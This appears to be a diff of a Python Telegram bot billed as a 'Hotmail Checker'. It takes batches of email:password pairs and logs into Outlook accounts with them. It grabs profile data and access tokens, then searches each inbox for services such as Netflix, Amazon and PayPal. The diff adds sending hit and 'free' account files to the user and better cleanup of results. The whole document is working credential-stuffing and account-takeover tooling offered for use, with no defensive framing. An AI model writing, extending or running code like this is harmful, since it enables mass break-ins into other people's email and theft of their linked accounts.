@@ -1,3 +1,4 @@
+
 import asyncio
 import re
 import uuid
@@ -17,7 +18,7 @@ import threading
 from collections import defaultdict
 import random
 import string
-import concurrent.futures
+import shutil
 
 # Configure logging
 logging.basicConfig(
@@ -36,8 +37,8 @@ OWNER_USERNAME = "@still_alivenow"
 OWNER_ID = 7125341830
 
 # Thread configuration
-MAX_THREADS = 10  # Increased from 10 to 50
-BATCH_SIZE = 10  # Process 100 accounts at a time
+MAX_THREADS = 10
+BATCH_SIZE = 10
 
 # Initialize bot
 app = Client(
@@ -49,16 +50,7 @@ app = Client(
 
 # Global variables for task management
 active_tasks: Dict[int, Dict] = {}  # user_id -> task info
-task_queue = queue.Queue()
-results_lock = threading.Lock()
-checker_instances = {}  # For session reuse
-user_states = {}  # user_id -> state data for conversation flow
 copy_cache = {}  # Cache for copy functionality
-
-# Animation symbols
-ANIMATION_FRAMES = ["⣾", "⣷", "⣯", "⣟", "⡿", "⢿", "⣻", "⣽"]
-PROGRESS_BAR = "█"
-EMPTY_BAR = "░"
 
 class OutlookProfileChecker:
     def __init__(self, user_id: int = None, debug: bool = False):
@@ -504,7 +496,7 @@ class OutlookProfileChecker:
             return {
                 "status": "SUCCESS",
                 "email": email,
-                "password": password,  # Added password to result
+                "password": password,
                 "profile": profile_result.get("profile") if profile_result["status"] == "SUCCESS" else None,
                 "searches": search_results,
                 "token": access_token,
@@ -542,6 +534,10 @@ def stop_user_task(user_id: int):
     return False
 
 # UI Helper functions
+ANIMATION_FRAMES = ["⣾", "⣷", "⣯", "⣟", "⡿", "⢿", "⣻", "⣽"]
+PROGRESS_BAR = "█"
+EMPTY_BAR = "░"
+
 def create_progress_bar(percentage: float, width: int = 20) -> str:
     """Create a visual progress bar"""
     filled = int(width * percentage / 100)
@@ -615,6 +611,14 @@ async def send_thinking_animation(chat_id: int):
     await app.send_chat_action(chat_id, ChatAction.CHOOSE_STICKER)
     await asyncio.sleep(1)
 
+async def process_single_account(email: str, password: str, targets: List[str]) -> Dict:
+    """Process single account"""
+    try:
+        async with OutlookProfileChecker(debug=False) as checker:
+            return await checker.check_account(email, password, targets)
+    except Exception as e:
+        return {"status": "ERROR", "error": str(e), "email": email, "password": password}
+
 # Worker function for batch processing with 50 threads
 async def batch_worker(user_id: int, accounts: List[Tuple[str, str]], targets: List[str], message: Message):
     """Process batch accounts with 50 concurrent workers"""
@@ -681,7 +685,7 @@ async def batch_worker(user_id: int, accounts: List[Tuple[str, str]], targets: L
                                 search_result = result["searches"][target]
                                 if search_result["status"] == "SUCCESS" and search_result.get("has_results"):
                                     target_found = True
-                                    # Create the formatted line
+                                    # Create the formatted line in EXACT requested format
                                     profile = result.get("profile", {})
                                     line = f"{email}:{password}"
                                     
@@ -720,25 +724,25 @@ async def batch_worker(user_id: int, accounts: List[Tuple[str, str]], targets: L
                                     
                                     hit_files[target].append(line)
                                     
-                                    # Send immediate notification for hits
+                                    # Send immediate notification for hits in EXACT requested format
                                     try:
                                         hit_message = (
                                             f"🎯 **TARGET HIT!**\n"
                                             f"{get_animation_frame()} **{target.upper()}** Found!\n\n"
-                                            f"```\n{line}\n```\n"
+                                            f"```\n{line}\n```\n\n"
                                             f"_Click above to copy_\n\n"
                                             f"👑 **Configured by:** {OWNER_USERNAME}"
                                         )
                                         
                                         # Create copy keyboard
+                                        copy_id = str(uuid.uuid4())
+                                        copy_cache[copy_id] = line
                                         copy_keyboard = InlineKeyboardMarkup([
                                             [
-                                                InlineKeyboardButton("📋 Copy", callback_data=f"copy_{str(uuid.uuid4())}"),
+                                                InlineKeyboardButton("📋 Copy", callback_data=f"copy_{copy_id}"),
                                                 InlineKeyboardButton("🔙 Menu", callback_data="back_to_menu")
                                             ]
                                         ])
-                                        # Store in cache
-                                        copy_cache[list(copy_keyboard.inline_keyboard[0][0].callback_data.split('_')[1])] = line
                                         
                                         await app.send_message(
                                             user_id,
@@ -780,7 +784,7 @@ async def batch_worker(user_id: int, accounts: List[Tuple[str, str]], targets: L
                             pass
                     
                     # Small delay to avoid rate limiting
-                    await asyncio.sleep(0.05)  # Reduced delay for faster processing
+                    await asyncio.sleep(0.05)
         
         # Save results to files
         for target, hits in hit_files.items():
@@ -802,8 +806,8 @@ async def batch_worker(user_id: int, accounts: List[Tuple[str, str]], targets: L
                                f"👑 **By:** {OWNER_USERNAME}",
                         reply_markup=create_back_keyboard()
                     )
-                except:
-                    pass
+                except Exception as e:
+                    logger.error(f"Error sending hits file for {target}: {e}")
         
         # Save free accounts
         if free_accounts:
@@ -811,11 +815,39 @@ async def batch_worker(user_id: int, accounts: List[Tuple[str, str]], targets: L
             async with aiofiles.open(free_filename, "w", encoding="utf-8") as f:
                 for line in free_accounts:
                     await f.write(line + "\n")
+            
+            # Send free accounts file
+            try:
+                await send_typing_animation(user_id, 1)
+                await app.send_document(
+                    user_id,
+                    free_filename,
+                    caption=f"✅ **Free Accounts**\n"
+                           f"📊 **Count:** {len(free_accounts)}\n"
+                           f"⚡ **Threads:** 50\n"
+                           f"👑 **By:** {OWNER_USERNAME}",
+                    reply_markup=create_back_keyboard()
+                )
+            except Exception as e:
+                logger.error(f"Error sending free accounts file: {e}")
         
-        # Clean up files
-        for file in os.listdir(results_dir):
-            os.remove(os.path.join(results_dir, file))
-        os.rmdir(results_dir)
+        # Clean up files and folder PROPERLY
+        try:
+            for file in os.listdir(results_dir):
+                file_path = os.path.join(results_dir, file)
+                try:
+                    if os.path.isfile(file_path):
+                        os.unlink(file_path)
+                    elif os.path.isdir(file_path):
+                        shutil.rmtree(file_path)
+                except Exception as e:
+                    logger.error(f"Error deleting file {file_path}: {e}")
+            
+            # Remove the directory itself
+            os.rmdir(results_dir)
+            logger.info(f"Cleaned up directory: {results_dir}")
+        except Exception as e:
+            logger.error(f"Error cleaning up directory {results_dir}: {e}")
         
         # Send final summary with celebration
         await send_typing_animation(user_id, 2)
@@ -823,14 +855,14 @@ async def batch_worker(user_id: int, accounts: List[Tuple[str, str]], targets: L
         summary = (
             f"🎉 **BATCH PROCESSING COMPLETE!**\n\n"
             f"📈 **FINAL STATISTICS**\n"
-            f"┌─────────────────────┐\n"
+            f"┌─────────────────────────────┐\n"
             f"│ • **Total Accounts**: {total_accounts}\n"
             f"│ • **Successfully Checked**: {successful}\n"
             f"│ • **Failed**: {total_accounts - successful}\n"
             f"│ • **Hits Found**: {sum(len(v) for v in hit_files.values())}\n"
             f"│ • **Free Accounts**: {len(free_accounts)}\n"
             f"│ • **Threads Used**: 50 ⚡\n"
-            f"└─────────────────────┘\n\n"
+            f"└─────────────────────────────┘\n\n"
         )
         
         # Add target-wise breakdown
@@ -859,14 +891,6 @@ async def batch_worker(user_id: int, accounts: List[Tuple[str, str]], targets: L
         )
     finally:
         remove_task(user_id)
-
-async def process_single_account(email: str, password: str, targets: List[str]) -> Dict:
-    """Process single account"""
-    try:
-        async with OutlookProfileChecker(debug=False) as checker:
-            return await checker.check_account(email, password, targets)
-    except Exception as e:
-        return {"status": "ERROR", "error": str(e), "email": email, "password": password}
 
 # Bot commands and handlers
 @app.on_callback_query()
@@ -905,7 +929,8 @@ async def callback_handler(client, callback_query):
                 f"**Features:**\n"
                 f"• 50 concurrent threads ⚡\n"
                 f"• Real-time hit notifications\n"
-                f"• Progress tracking",
+                f"• Progress tracking\n"
+                f"• Sends hit_{target}.txt and free.txt files",
                 parse_mode=ParseMode.MARKDOWN,
                 reply_markup=create_back_keyboard()
             )
@@ -935,7 +960,7 @@ async def callback_handler(client, callback_query):
                 
                 status_text = (
                     f"📊 **Task Status**\n\n"
-                    f"┌───────────────┐\n"
+                    f"┌─────────────────────┐\n"
                     f"│ • **Type**: {task['type'].upper()}\n"
                     f"│ • **Status**: {'✅ Running' if task.get('running', True) else '🛑 Stopped'}\n"
                     f"│ • **Duration**: {elapsed:.1f}s\n"
@@ -946,7 +971,7 @@ async def callback_handler(client, callback_query):
                     status_text += f"│ • **Targets**: {', '.join(task['data'].get('targets', []))}\n"
                     status_text += f"│ • **Threads**: 50 ⚡\n"
                 
-                status_text += f"└───────────────┘\n\n"
+                status_text += f"└─────────────────────┘\n\n"
                 status_text += f"{get_animation_frame()} **Working...**"
                 
             else:
@@ -975,7 +1000,8 @@ async def callback_handler(client, callback_query):
                 f"• Real-time hit notifications\n"
                 f"• Profile information extraction\n"
                 f"• Inbox search for targets\n"
-                f"• Batch processing with 50 threads ⚡\n\n"
+                f"• Batch processing with 50 threads ⚡\n"
+                f"• Automatic file cleanup\n\n"
                 f"**Need Help?**\n"
                 f"Contact: {OWNER_USERNAME}",
                 parse_mode=ParseMode.MARKDOWN,
@@ -993,7 +1019,7 @@ async def callback_handler(client, callback_query):
                 # Show copied message
                 await callback_query.answer("✅ Copied to clipboard!\n📋 Click and hold to select text", show_alert=True)
                 
-                # Optionally, send the text as a separate message
+                # Send the text as a separate message for easy copying
                 await callback_query.message.reply_text(
                     f"📋 **Copy this text:**\n\n"
                     f"```\n{text_to_copy}\n```\n\n"
@@ -1002,29 +1028,6 @@ async def callback_handler(client, callback_query):
                 )
             else:
                 await callback_query.answer("❌ Copy failed. Text not found.", show_alert=True)
-        
-        elif data == "copy_summary":
-            # Handle copy summary from single check
-            message_text = callback_query.message.text
-            # Extract the summary line from message
-            if "**SUMMARY**" in message_text:
-                summary_start = message_text.find("```") + 3
-                summary_end = message_text.rfind("```")
-                if summary_start > 3 and summary_end > summary_start:
-                    text_to_copy = message_text[summary_start:summary_end].strip()
-                    await callback_query.answer("✅ Copied to clipboard!\n📋 Click and hold to select text", show_alert=True)
-                    
-                    # Send the text as a separate message for easy copying
-                    await callback_query.message.reply_text(
-                        f"📋 **Copy this text:**\n\n"
-                        f"```\n{text_to_copy}\n```\n\n"
-                        f"_Click above to select, then copy_",
-                        parse_mode=ParseMode.MARKDOWN
-                    )
-                else:
-                    await callback_query.answer("❌ Could not find summary to copy.", show_alert=True)
-            else:
-                await callback_query.answer("❌ No summary found to copy.", show_alert=True)
     
     except Exception as e:
         logger.error(f"Callback error: {e}")
@@ -1038,7 +1041,8 @@ async def send_main_menu(message: Message):
         f"• Login & Profile Extraction\n"
         f"• Inbox Search for Targets\n"
         f"• Batch Processing (50 threads) ⚡\n"
-        f"• Real-time Hit Notifications\n\n"
+        f"• Real-time Hit Notifications\n"
+        f"• Automatic File Cleanup\n\n"
         f"{format_credits()}"
     )
     
@@ -1306,7 +1310,8 @@ async def batch_command(client, message: Message):
             f"**Example:**\n"
             f"Reply to your file with:\n"
             f"`/batch netflix amazon paypal`\n\n"
-            f"⚡ **50 threads will be used for faster processing!**",
+            f"⚡ **50 threads will be used for faster processing!**\n"
+            f"📦 **Files sent:** hit_{{target}}.txt & free.txt",
             parse_mode=ParseMode.MARKDOWN,
             reply_markup=create_back_keyboard()
         )
@@ -1384,6 +1389,7 @@ async def batch_command(client, message: Message):
             f"│ **Status**: Initializing...\n"
             f"└─────────────────────────┘\n\n"
             f"{get_animation_frame()} **Starting 50 workers...**\n\n"
+            f"📦 **Will send:** hit_{{target}}.txt & free.txt\n"
             f"👑 **By:** {OWNER_USERNAME}",
             parse_mode=ParseMode.MARKDOWN,
             reply_markup=create_back_keyboard()
@@ -1475,7 +1481,8 @@ async def help_command(client, message: Message):
         f"• Profile extraction 📋\n"
         f"• Inbox search for targets 🔍\n"
         f"• Batch processing with 50 threads ⚡\n"
-        f"• Copy button for easy copying 📋\n\n"
+        f"• Copy button for easy copying 📋\n"
+        f"• Automatic file cleanup 🧹\n\n"
         f"**Need Help?**\n"
         f"Contact: {OWNER_USERNAME}\n\n"
         f"{format_credits()}"
@@ -1504,6 +1511,7 @@ async def main():
     │   HOTMAIL CHECKER BOT v2.0  │
     │    Enhanced UI Edition      │
     │      50 THREADS MODE ⚡     │
+    │    AUTO CLEANUP ENABLED     │
     └─────────────────────────────┘
     """
     print(banner)
@@ -1524,7 +1532,8 @@ async def main():
             f"• Bot: @{bot_info.username}\n"
             f"• Threads: {MAX_THREADS} ⚡\n"
             f"• Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
-            f"• Status: ✅ Online",
+            f"• Status: ✅ Online\n"
+            f"• Auto Cleanup: ✅ Enabled",
             parse_mode=ParseMode.MARKDOWN
         )
     except Exception as e:
